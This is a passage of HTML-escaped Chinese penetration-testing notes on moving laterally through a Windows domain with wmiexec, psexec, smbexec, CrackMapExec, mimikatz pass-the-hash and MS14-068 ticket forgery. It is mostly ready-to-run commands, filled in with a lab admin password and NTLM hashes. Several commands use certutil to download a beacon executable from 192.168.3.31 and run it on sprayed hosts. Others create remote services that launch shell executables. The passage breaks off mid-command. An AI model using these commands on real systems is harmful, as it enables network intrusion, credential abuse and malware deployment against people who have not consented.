prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;下载后门并执行：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmiexec ./Administrator:admin!@#45@192.168.3.32 &amp;quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:/beacon.exe &amp;amp; c:/beacon.exe &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;smb-横向渗透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#smb-横向渗透&#34;&gt;#&lt;/a&gt; SMB 横向渗透&lt;/h4&gt;
&lt;p&gt;利用 SMB 服务可以通过明文或 hash 传递来远程执行， 445 服务端口开放。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;内置命令psexec64 、外部命令psexec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;内部&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;psexec64 \\192.168.3.32 - u administrator - p admin!@#45 - s cmd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;外部&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;插件：cs-psexec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;内置命令services&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 create -name shell -display shellexec -path C:\Windows\System32\shell.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;services -hashes :518b98ad4178a53695dc997aa02d455c ./administrator:@192.168.3.32 start -name shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;Impacket-Smbexec 套件&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;针对明文密码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;普通用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;smbexec ./administrator:admin!@#45@192.168.3.32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;域内用户&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;smbexec god/administrator:admin!@#45@192.168.3.32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;针对&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;（交互式的shell，可以在cmd上下载木马绕过杀软）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;smbexec -hashes :518b98ad4178a53695dc997aa02d455c god/administrator@192.168.3.32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;crackmapexec&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#crackmapexec&#34;&gt;#&lt;/a&gt; CrackMapExec&lt;/h4&gt;
&lt;p&gt;（ 1 ）工具批量密码喷射（支持 hash）&lt;/p&gt;
&lt;p&gt;Github：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1BvcmNoZXR0YS1JbmR1c3RyaWVzL0NyYWNrTWFwRXhlYw==&#34;&gt;https://github.com/Porchetta-Industries/CrackMapExec&lt;/span&gt;&lt;br&gt;
 官方手册：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcGduLmdpdGJvb2suaW8vY3JhY2ttYXBleGVjLw==&#34;&gt;https://mpgn.gitbook.io/crackmapexec/&lt;/span&gt;&lt;br&gt;
 部分案例：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vc2VjdG9vbC8xODQ1NzMuaHRtbA==&#34;&gt;https://www.freebuf.com/sectool/184573.html&lt;/span&gt;&lt;br&gt;
 下载对应 release，建立 socks 连接，设置 socks 代理，配置规则，调用！&lt;/p&gt;
&lt;p&gt;（ 2 ）Linux Proxychains 使用&lt;/p&gt;
&lt;p&gt;安装使用：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMDg2NjkwL2FydGljbGUvZGV0YWlscy8xMjE3Nzk4MzI=&#34;&gt;https://blog.csdn.net/qq_53086690/article/details/121779832&lt;/span&gt;&lt;br&gt;
 代理配置：Proxychains.conf&lt;br&gt;
 代理调用：Proxychains 命令&lt;/p&gt;
&lt;p&gt;（ 3 ）CrackMapExec 使用&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;密码喷射域用户登录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cme smb 192.168.3.21-32 -u administrator -p &amp;#x27;admin!@#45&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;密码喷射本地用户登录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cme smb 192.168.3.21-32 -u administrator -p &amp;#x27;admin!@#45&amp;#x27; --local-auth&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;密码喷射本地登录命令执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cme smb 192.168.3.21-32 -u administrator -p &amp;#x27;admin!@#45&amp;#x27; -x &amp;#x27;whoami&amp;#x27; --local-auth&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;密码喷射本地登录命令执行上线&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cme smb 192.168.3.21- 32 - u administrator -p &amp;#x27;admin!@#45&amp;#x27; -x &amp;#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe &amp;amp; c:/4455.exe&amp;#x27; --local-auth&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;密码喷射域登录命令执行上线&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cme smb 192.168.3.21- 32 - u administrator -p &amp;#x27;admin!@#45&amp;#x27; -x &amp;#x27;cmd.exe /c certutil -urlcache -split -f [http://192.168.3.31/4455.exe](http://192.168.3.31/4455.exe) c:/4455.exe &amp;amp; c:/4455.exe&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;密码喷射本地和域登录命令执行全自动上线&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cme smb 192.168.3.21- 32 - u user.txt -p pass.txt -x &amp;#x27;cmd.exe /c certutil -urlcache -split -f [http://192.168.3.31/4455.exe](http://192.168.3.31/4455.exe) c:/4455.exe &amp;amp; c:/4455.exe&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cme smb 192.168.3.21- 32 - u administrator -p pass.txt -x &amp;#x27;cmd.exe /c certutil -urlcache -split -f [http://192.168.3.31/4455.exe](http://192.168.3.31/4455.exe) c:/4455.exe &amp;amp; c:/4455.exe&amp;#x27; --local-auth&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;pth-哈希传递攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pth-哈希传递攻击&#34;&gt;#&lt;/a&gt; PTH 哈希传递攻击&lt;/h4&gt;
&lt;p&gt;PTH (pass the hash)：哈希传递攻击，利用的 lm 或 ntlm 的值进行的渗透测试（NTLM 认证攻击）&lt;/p&gt;
&lt;p&gt;PTH = Pass The Hash，通过密码散列值 (通常是 NTLM Hash) 来进行攻击。 在域环境中，用户登录计算机时使用的域账号，计算机会用相同本地管理员账 号和密码。因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就 可以使用哈希传递的方法登录到内网主机的其他计算机。另外注意在 Window S erver 2012 R2 之前使用到的密码散列值是 LM、NTLM，在 2012 R2 及其版本 之后使用到的密码散列值是 NTLM Hash。&lt;/p&gt;
&lt;p&gt;（ 1 ）mimikatz&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;改回连时间-提权至system-继续改回连时间-导出&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;和明文此方法会在肉鸡上弹出cmd，如果条件不满足，则一般不采用这种方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz privilege::debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过pth导入票据攻击此票据对应的机器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a5xxx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在肉鸡上弹出来的cmd执行以下命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net use \\192.168.3.32\c$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;copy beacon.exe \\192.168.3.32\c$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过创建服务绑定exe程序上线exe程序&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sc \\sqlserver create bshell binpath= &amp;quot;c:\4.exe&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sc \\sqlserver start bshell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 2 ）impacket 套件&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将肉鸡进行socket代理转发，用proxifier建立规则，通过本机的套件进行测试，通过cs的文件浏览功能将木马放在跳板机web上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用cmd窗口下载木马运行上线。当&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;与所要攻击的主机及用户名对应的时候，则会取得权限。但是受限于这三种方法的协议端口是否正常开启。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;psexec -hashes :NTLM值 域名/域用户@域内ip地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;smbexec -hashes :NTLM值 域名/域用户@域内ip地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmiexec -hashes :NTLM值 域名/域用户@域内ip地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python psexec.py -hashes :518b98ad48a* ./administrator@192.168.3.32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python smbexec.py -hashes :518b98ad78a* ./administrator@192.168.3.32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python wmiexec.py -hashes :518b98ad41a* ./administrator@192.168.3.32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 3 ）CrackMapExec 密码喷射&lt;br&gt;
项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1BvcmNoZXR0YS1JbmR1c3RyaWVzL0NyYWNrTWFwRXhlYw==&#34;&gt;https://github.com/Porchetta-Industries/CrackMapExec&lt;/span&gt;&lt;br&gt;
 官方手册：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcGduLmdpdGJvb2suaW8vY3JhY2ttYXBleGVjLw==&#34;&gt;https://mpgn.gitbook.io/crackmapexec/&lt;/span&gt;&lt;br&gt;
 部分案例：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vc2VjdG9vbC8xODQ1NzMuaHRtbA==&#34;&gt;https://www.freebuf.com/sectool/184573.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;下载对应 release，建立 socks 连接，设置 socks 代理，配置规则，修改 Proxychains.conf 进行代理配置，而后通过 Proxychains 调用命令。依次对所有扫描到的用户进行 pth 攻击。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a. 域用户HASH登录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cme smb 192.168.3.21- 32 - u user.txt -H 518b98adxxx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b. 本地用户HASH登录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cme smb 192.168.3.21- 32 - u administrator -H 518b98xxx --local-auth&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;ptt-票据传递攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ptt-票据传递攻击&#34;&gt;#&lt;/a&gt; PTT 票据传递攻击&lt;/h4&gt;
&lt;p&gt;PTT (pass the ticket) ：票据传递攻击，利用的票据凭证 TGT 进行渗透测试（Kerberos 认证攻击）&lt;/p&gt;
&lt;p&gt;Kerberos 相当于 web 中的 cookie 和 session，需要进行身份认证。票据自生成之后，存活时间较短，一般设置为 7 天，票据存活失效之后，此票据便无用。&lt;/p&gt;
&lt;p&gt;链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kva2VrZW8vcmVsZWFzZXM=&#34;&gt;https://github.com/gentilkiwi/kekeo/releases&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（ 1 ）MS14068 (webadmin 权限)&lt;br&gt;
 项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FiYXRjaHkxNy9XaW5kb3dzRXhwbG9pdHMvdHJlZS9tYXN0ZXIvTVMxNC0wNjg=&#34;&gt;https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;MS14-068 是密钥分发中心 (KDC) 服务中的 Windows 漏洞。它允许经过 身份验证的用户在其 Kerberos 票证 (TGT) 中插入任意 PAC。该漏洞位于 kdcs vc.dll 域控制器的密钥分发中心 (KDC) 中。用户可以通过呈现具有改变的 PAC 的 Kerberos TGT 来获得票证。利用漏洞生成的用户的新身份票据尝试认证&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取SID值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell whoami/user&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成票据文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell ms14-068.exe 